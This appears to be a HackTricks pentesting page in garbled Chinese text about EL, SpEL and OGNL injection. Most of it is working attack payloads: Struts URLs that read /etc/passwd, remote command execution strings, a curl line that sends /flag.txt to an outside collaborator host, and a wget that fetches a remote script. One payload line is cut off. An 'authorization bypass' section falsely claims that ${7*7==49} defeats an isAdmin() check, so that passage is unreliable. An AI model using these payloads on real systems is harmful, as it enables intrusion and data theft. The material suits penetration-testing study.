# EL - è¡¨è¾¾å¼è¯­è¨€

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

EL æä¾›äº†ä¸€ä¸ªé‡è¦çš„æœºåˆ¶ï¼Œç”¨äºä½¿è¡¨ç¤ºå±‚ï¼ˆç½‘é¡µï¼‰ä¸åº”ç”¨é€»è¾‘ï¼ˆæ‰˜ç®¡çš„ beanï¼‰è¿›è¡Œé€šä¿¡ã€‚

### å®ƒåœ¨å“ªé‡Œä½¿ç”¨ï¼Ÿ

1. **Spring æ¡†æ¶**ï¼šå®‰å…¨æ€§ã€æ•°æ®ç­‰
2. **ä»»ä½•å¼€å‘äººå‘˜ä½¿ç”¨ SpEL API çš„åœ°æ–¹**
3. å¯¹äºè¯­è¨€ï¼Œå®ƒå¯ä»¥åœ¨ Javaã€Kotlinã€Scala å’Œå…¶ä»–åŸºäº JVM çš„æŠ€æœ¯ä¸­ä½¿ç”¨ã€‚

EL è¢«**å¤šä¸ª JavaEE æŠ€æœ¯**ä½¿ç”¨ï¼Œä¾‹å¦‚ JavaServer Faces æŠ€æœ¯ã€JavaServer Pages (JSP) æŠ€æœ¯å’Œ Java EE çš„ä¸Šä¸‹æ–‡å’Œä¾èµ–æ³¨å…¥ï¼ˆCDIï¼‰ã€‚EL ä¹Ÿå¯ä»¥åœ¨ç‹¬ç«‹ç¯å¢ƒä¸­ä½¿ç”¨ã€‚

Java åº”ç”¨ç¨‹åº**å¾ˆå®¹æ˜“è¯†åˆ«**ï¼Œå› ä¸ºå®ƒä»¬å€¾å‘äºä½¿ç”¨æ‰©å±•åä¸º**.jsp**æˆ–**.jsf**ï¼ŒæŠ›å‡º**å †æ ˆé”™è¯¯**å¹¶åœ¨å¤´éƒ¨ä½¿ç”¨**"Serverlet"**è¿™æ ·çš„æœ¯è¯­ã€‚

{% hint style="info" %}
æ ¹æ®**EL ç‰ˆæœ¬**ï¼ŒæŸäº›**åŠŸèƒ½**å¯èƒ½æ˜¯**å¼€å¯**æˆ–**å…³é—­**çš„ï¼Œé€šå¸¸æŸäº›**å­—ç¬¦**å¯èƒ½æ˜¯**ä¸å…è®¸**çš„ã€‚
{% endhint %}

## åŸºæœ¬ç¤ºä¾‹

ï¼ˆä½ å¯ä»¥åœ¨[https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/)æ‰¾åˆ°å¦ä¸€ä¸ªæœ‰è¶£çš„å…³äº EL çš„æ•™ç¨‹ï¼‰

ä» [**Maven**](https://mvnrepository.com) ä»“åº“ä¸‹è½½ä»¥ä¸‹ jar æ–‡ä»¶ï¼š

* `commons-lang3-3.9.jar`
* `spring-core-5.2.1.RELEASE.jar`
* `commons-logging-1.2.jar`
* `spring-expression-5.2.1.RELEASE.jar`

å¹¶åˆ›å»ºä»¥ä¸‹ `Main.java` æ–‡ä»¶ï¼š
```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Main {
public static ExpressionParser PARSER;

public static void main(String[] args) throws Exception {
PARSER = new SpelExpressionParser();

System.out.println("Enter a String to evaluate:");
java.io.BufferedReader stdin = new java.io.BufferedReader(new java.io.InputStreamReader(System.in));
String input = stdin.readLine();
Expression exp = PARSER.parseExpression(input);
String result = exp.getValue().toString();
System.out.println(result);
}
}
```
æ¥ä¸‹æ¥ç¼–è¯‘ä»£ç ï¼ˆå¦‚æœæ‚¨æ²¡æœ‰å®‰è£…`javac`ï¼Œè¯·å®‰è£…`sudo apt install default-jdk`ï¼‰ï¼š
```java
javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main.java
```
ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œåº”ç”¨ç¨‹åºï¼š
```java
java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main
Enter a String to evaluate:
{5*5}
[25]
```
è¯·æ³¨æ„ï¼Œåœ¨ä¸Šä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œæœ¯è¯­`{5*5}`è¢«**è¯„ä¼°**äº†ã€‚

## **CVEç¤ºä¾‹**

ä»ä½ å·²ç»çœ‹åˆ°çš„ï¼Œæˆ‘æ•¢æ‰“èµŒä½ çŸ¥é“æ¥ä¸‹æ¥ä¼šå‘ç”Ÿä»€ä¹ˆã€‚å¦‚æœå¼€å‘äººå‘˜æ­£åœ¨ä½¿ç”¨SpELä¸ç”¨æˆ·è¾“å…¥ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ³¨å…¥çš„æœ‰æ•ˆè´Ÿè½½ã€‚è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰çš„ä¾‹å­ã€‚å®ƒæ˜¯ä½œä¸º[CVE-2017-8046](https://github.com/m3ssap0/SpringBreakVulnerableApp)æ¼æ´åˆ©ç”¨çš„ä¸€éƒ¨åˆ†è€Œåˆ›å»ºçš„ã€‚

![Image for post](https://miro.medium.com/max/1933/1\*qyl6ZLeJOyXmxmdqMcT8tg.png)

å®ƒç”±3ä¸ªéƒ¨åˆ†ç»„æˆï¼š

* é»‘è‰² - å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœç›´æ¥å¤åˆ¶åˆ°HTTPè¯·æ±‚çš„è¾“å‡ºæµä¸­
* çº¢è‰² - è·å–Java Runtimeå¹¶åœ¨ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤
* è“è‰² - åŒ…å«å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼š`cmd /c dir`ã€‚ä¸ºäº†ä½¿å…¶æ›´å¥å£®ï¼Œå‘½ä»¤çš„å„ä¸ªå­—ç¬¦éƒ½ä»æ•°å­—ä¸­è§£ç ã€‚

æ‰§è¡Œç»“æœï¼š

![Image for post](https://miro.medium.com/max/982/1\*APSYwU3qbw0rNJAd2xhdNA.png)

## æœ‰æ•ˆè´Ÿè½½

### åŸºæœ¬æ“ä½œ
```bash
#Basic string operations examples
{"a".toString()}
[a]

{"dfd".replace("d","x")}
[xfx]

#Access to the String class
{"".getClass()}
[class java.lang.String]

#Access ro the String class bypassing "getClass"
#{""["class"]}

#Access to arbitrary class
{"".getClass().forName("java.util.Date")}
[class java.util.Date]

#List methods of a class
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}
[public boolean java.util.Date.equals(java.lang.Object)]
```
### æ£€æµ‹

* Burpæ£€æµ‹
```bash
gk6q${â€œzkzâ€.toString().replace(â€œkâ€, â€œxâ€)}doap2
#The value returned was "igk6qzxzdoap2", indicating of the execution of the expression.
```
* J2EEæ£€æµ‹
```bash
#J2EEScan Detection vector (substitute the content of the response body with the content of the â€œINJPARAMâ€ parameter concatenated with a sum of integer):
https://www.example.url/?vulnerableParameter=PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&INJPARAM=HOOK_VAL
```
* ç­‰å¾…10ç§’é’Ÿ
```bash
#Blind detection vector (sleep during 10 seconds)
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
```
### è¿œç¨‹æ–‡ä»¶åŒ…å«

Remote File Inclusionï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼‰æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer-Side Template Injectionï¼ŒSSTIï¼‰æ”»å‡»æŠ€æœ¯ã€‚å®ƒåˆ©ç”¨äº†åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œè¿œç¨‹æ–‡ä»¶ã€‚è¿™ç§æ”»å‡»é€šå¸¸å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºä½¿ç”¨ç”¨æˆ·æä¾›çš„è¾“å…¥æ¥åŠ¨æ€åŒ…å«æ–‡ä»¶çš„æƒ…å†µä¸‹ã€‚

æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œå°†è¿œç¨‹æ–‡ä»¶çš„å†…å®¹åŒ…å«åˆ°åº”ç”¨ç¨‹åºçš„å“åº”ä¸­ã€‚è¿™å¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€æœåŠ¡å™¨ç«¯ä»£ç æ‰§è¡Œã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œç­‰å®‰å…¨é—®é¢˜ã€‚

è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´é€šå¸¸å‡ºç°åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨äº†ä¸å®‰å…¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°æˆ–è€…æ²¡æœ‰æ­£ç¡®è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æƒ…å†µä¸‹ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´æ¥æ³¨å…¥æ¶æ„ä»£ç ï¼Œä»è€Œæ‰§è¡Œä»»æ„çš„æœåŠ¡å™¨ç«¯æ“ä½œã€‚

ä¸ºäº†é˜²æ­¢è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¼€å‘äººå‘˜åº”è¯¥éµå¾ªå®‰å…¨çš„ç¼–ç å®è·µï¼ŒåŒ…æ‹¬æ­£ç¡®è¿‡æ»¤å’ŒéªŒè¯ç”¨æˆ·è¾“å…¥ã€ä½¿ç”¨å®‰å…¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°ã€é™åˆ¶æ–‡ä»¶åŒ…å«è·¯å¾„ç­‰ã€‚æ­¤å¤–ï¼Œå®šæœŸæ›´æ–°å’Œä¿®è¡¥åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´ä¹Ÿæ˜¯éå¸¸é‡è¦çš„ã€‚
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd
```
### ç›®å½•åˆ—è¡¨

Directory listing is a feature provided by web servers that allows users to view the contents of a directory on a website. It can be useful for navigating through the files and folders on a website, but it can also pose a security risk if sensitive information is exposed.

ç›®å½•åˆ—è¡¨æ˜¯ç”±WebæœåŠ¡å™¨æä¾›çš„åŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·æŸ¥çœ‹ç½‘ç«™ä¸Šç›®å½•çš„å†…å®¹ã€‚å®ƒå¯ä»¥å¸®åŠ©ç”¨æˆ·æµè§ˆç½‘ç«™ä¸Šçš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œä½†å¦‚æœæ•æ„Ÿä¿¡æ¯è¢«å…¬å¼€ï¼Œä¹Ÿå¯èƒ½å¸¦æ¥å®‰å…¨é£é™©ã€‚

By default, many web servers have directory listing enabled for directories that do not contain an index file (such as index.html or index.php). This means that if a directory does not have an index file, the server will display a list of all the files and folders within that directory.

é»˜è®¤æƒ…å†µä¸‹ï¼Œè®¸å¤šWebæœåŠ¡å™¨å¯¹ä¸åŒ…å«ç´¢å¼•æ–‡ä»¶ï¼ˆå¦‚index.htmlæˆ–index.phpï¼‰çš„ç›®å½•å¯ç”¨äº†ç›®å½•åˆ—è¡¨åŠŸèƒ½ã€‚è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªç›®å½•æ²¡æœ‰ç´¢å¼•æ–‡ä»¶ï¼ŒæœåŠ¡å™¨å°†æ˜¾ç¤ºè¯¥ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„åˆ—è¡¨ã€‚

From a security perspective, directory listing can be problematic because it can reveal sensitive information about the website's structure and files. Attackers can use this information to identify potential vulnerabilities or access files that were not intended to be publicly accessible.

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œç›®å½•åˆ—è¡¨å¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œå› ä¸ºå®ƒå¯ä»¥æ­ç¤ºæœ‰å…³ç½‘ç«™ç»“æ„å’Œæ–‡ä»¶çš„æ•æ„Ÿä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›ä¿¡æ¯æ¥è¯†åˆ«æ½œåœ¨çš„æ¼æ´æˆ–è®¿é—®æœ¬ä¸åº”å…¬å¼€è®¿é—®çš„æ–‡ä»¶ã€‚

To mitigate the risk of directory listing, it is recommended to disable directory listing on the web server. This can usually be done by modifying the server's configuration file or using a web application firewall (WAF) to block directory listing requests.

ä¸ºäº†å‡è½»ç›®å½•åˆ—è¡¨çš„é£é™©ï¼Œå»ºè®®åœ¨WebæœåŠ¡å™¨ä¸Šç¦ç”¨ç›®å½•åˆ—è¡¨ã€‚é€šå¸¸å¯ä»¥é€šè¿‡ä¿®æ”¹æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶æˆ–ä½¿ç”¨Webåº”ç”¨ç¨‹åºé˜²ç«å¢™ï¼ˆWAFï¼‰æ¥é˜»æ­¢ç›®å½•åˆ—è¡¨è¯·æ±‚æ¥å®ç°ã€‚

Additionally, it is important to ensure that sensitive files and directories are properly protected and not accessible through directory listing. This can be achieved by placing an index file in each directory or using access control mechanisms to restrict access to sensitive files.

æ­¤å¤–ï¼Œé‡è¦çš„æ˜¯ç¡®ä¿æ•æ„Ÿæ–‡ä»¶å’Œç›®å½•å¾—åˆ°é€‚å½“çš„ä¿æŠ¤ï¼Œå¹¶ä¸”ä¸èƒ½é€šè¿‡ç›®å½•åˆ—è¡¨è®¿é—®ã€‚å¯ä»¥é€šè¿‡åœ¨æ¯ä¸ªç›®å½•ä¸­æ”¾ç½®ç´¢å¼•æ–‡ä»¶æˆ–ä½¿ç”¨è®¿é—®æ§åˆ¶æœºåˆ¶æ¥é™åˆ¶å¯¹æ•æ„Ÿæ–‡ä»¶çš„è®¿é—®æ¥å®ç°è¿™ä¸€ç‚¹ã€‚
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
```
### RCE

* RCEçš„åŸºæœ¬**è§£é‡Š**
```bash
#Check the method getRuntime is there
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
[public static java.lang.Runtime java.lang.Runtime.getRuntime()]

#Execute command (you won't see the command output in the console)
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}
[Process[pid=10892, exitValue=0]]

#Execute command bypassing "getClass"
#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}

# With HTMl entities injection inside the template
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
* RCE **linux**
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* RCE **Windows**ï¼ˆæœªç»æµ‹è¯•ï¼‰
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* **æ›´å¤šçš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰**
```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime via getDeclaredConstructors
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using processbuilder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// Method using ScriptEngineManager
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");

//https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt
(T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec("cmd "+T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))+"c "+T(java.lang.String).valueOf(new char[]{T(java.lang.Character).toChars(100)[0],T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(114)[0]})).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()))
T(java.lang.System).getenv()[0]
T(java.lang.Runtime).getRuntime().exec('ping my-domain.com')
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cmd /c dir").getInputStream())
''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')
```
### æ£€æŸ¥ç¯å¢ƒ

* `applicationScope` - å…¨å±€åº”ç”¨ç¨‹åºå˜é‡
* `requestScope` - è¯·æ±‚å˜é‡
* `initParam` - åº”ç”¨ç¨‹åºåˆå§‹åŒ–å˜é‡
* `sessionScope` - ä¼šè¯å˜é‡
* `param.X` - å‚æ•°å€¼ï¼Œå…¶ä¸­Xæ˜¯httpå‚æ•°çš„åç§°

æ‚¨éœ€è¦å°†è¿™äº›å˜é‡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š
```bash
${sessionScope.toString()}
```
#### æˆæƒç»•è¿‡ç¤ºä¾‹

In some cases, the server-side template injection vulnerability can be used to bypass authorization checks and access restricted functionality or data. One common technique is to inject an expression that evaluates to true in the context of the authorization check.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´å¯ä»¥ç”¨äºç»•è¿‡æˆæƒæ£€æŸ¥å¹¶è®¿é—®å—é™åŠŸèƒ½æˆ–æ•°æ®ã€‚ä¸€ç§å¸¸è§çš„æŠ€æœ¯æ˜¯æ³¨å…¥ä¸€ä¸ªåœ¨æˆæƒæ£€æŸ¥ä¸Šä¸‹æ–‡ä¸­è¯„ä¼°ä¸ºtrueçš„è¡¨è¾¾å¼ã€‚

For example, let's say there is an application that uses a template engine that supports Expression Language (EL). The application has an authorization check that verifies if the user is an administrator before allowing access to certain functionality.

ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªä½¿ç”¨æ”¯æŒè¡¨è¾¾å¼è¯­è¨€ï¼ˆELï¼‰çš„æ¨¡æ¿å¼•æ“çš„åº”ç”¨ç¨‹åºã€‚è¯¥åº”ç”¨ç¨‹åºåœ¨å…è®¸è®¿é—®æŸäº›åŠŸèƒ½ä¹‹å‰ï¼Œä¼šè¿›è¡Œä¸€ä¸ªéªŒè¯ï¼Œä»¥éªŒè¯ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ã€‚

The authorization check might look something like this:

æˆæƒæ£€æŸ¥å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š

```java
if (user.isAdmin()) {
    // Allow access to restricted functionality
} else {
    // Deny access
}
```

To bypass this authorization check, an attacker can inject an EL expression that evaluates to true. For example, the following payload can be injected:

ä¸ºäº†ç»•è¿‡è¿™ä¸ªæˆæƒæ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä¸€ä¸ªè¯„ä¼°ä¸ºtrueçš„ELè¡¨è¾¾å¼ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥æ³¨å…¥ä»¥ä¸‹æœ‰æ•ˆè½½è·ï¼š

```
${7 * 7 == 49}
```

When the template engine evaluates this expression, it will return true, bypassing the authorization check and allowing the attacker to access the restricted functionality.

å½“æ¨¡æ¿å¼•æ“è¯„ä¼°è¿™ä¸ªè¡¨è¾¾å¼æ—¶ï¼Œå®ƒå°†è¿”å›trueï¼Œç»•è¿‡æˆæƒæ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…è®¿é—®å—é™åŠŸèƒ½ã€‚

It's important to note that the specific syntax and behavior of EL expressions may vary depending on the template engine being used. Therefore, it's crucial to understand the syntax and capabilities of the template engine in order to craft effective payloads.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒELè¡¨è¾¾å¼çš„å…·ä½“è¯­æ³•å’Œè¡Œä¸ºå¯èƒ½å› æ‰€ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“è€Œå¼‚ã€‚å› æ­¤ï¼Œäº†è§£æ¨¡æ¿å¼•æ“çš„è¯­æ³•å’ŒåŠŸèƒ½æ˜¯éå¸¸é‡è¦çš„ï¼Œä»¥ä¾¿æ„é€ æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ã€‚
```bash
${pageContext.request.getSession().setAttribute("admin", true)}
```
åº”ç”¨ç¨‹åºè¿˜å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰å˜é‡ï¼Œä¾‹å¦‚ï¼š
```bash
${user}
${password}
${employee.FirstName}
```
## WAFç»•è¿‡

æŸ¥çœ‹[https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/](https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/)

## å‚è€ƒèµ„æ–™

* [https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/](https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/)
* [https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools)
* [https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt](https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
